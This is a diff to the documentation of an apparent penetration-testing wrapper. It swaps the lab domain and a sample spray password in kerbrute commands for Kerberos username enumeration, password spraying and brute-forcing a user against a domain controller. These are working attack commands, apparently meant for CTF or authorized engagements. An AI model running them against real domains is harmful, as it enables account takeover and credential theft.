@@ -16,11 +16,11 @@ authorization). It is built into the container (`/usr/local/bin/kerbrute`).
 
 ```bash
 # validate/enumerate a username list against the KDC (valid user vs unknown)
-pwnloop x "kerbrute userenum -d bruno.vl --dc $T /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o /engagements/$NAME/loot/kerb-users.txt"
+pwnloop x "kerbrute userenum -d machine.htb --dc $T /usr/share/seclists/Usernames/xato-net-10-million-usernames-dup.txt -o /engagements/$NAME/loot/kerb-users.txt"
 # password spray — one password, every user; kerbrute also grabs the AS-REP for
 # any pre-auth-disabled account it hits, so it doubles as an AS-REP roast
-pwnloop x "kerbrute passwordspray -d bruno.vl --dc $T users.txt 'Sunshine1'"
-pwnloop x "kerbrute bruteuser -d bruno.vl --dc $T /usr/share/wordlists/rockyou.txt <user>"
+pwnloop x "kerbrute passwordspray -d machine.htb --dc $T users.txt 'Season2025!'"
+pwnloop x "kerbrute bruteuser -d machine.htb --dc $T /usr/share/wordlists/rockyou.txt <user>"
 ```
 
 Pre-auth replies are the oracle: `KDC_ERR_C_PRINCIPAL_UNKNOWN` = no such user,
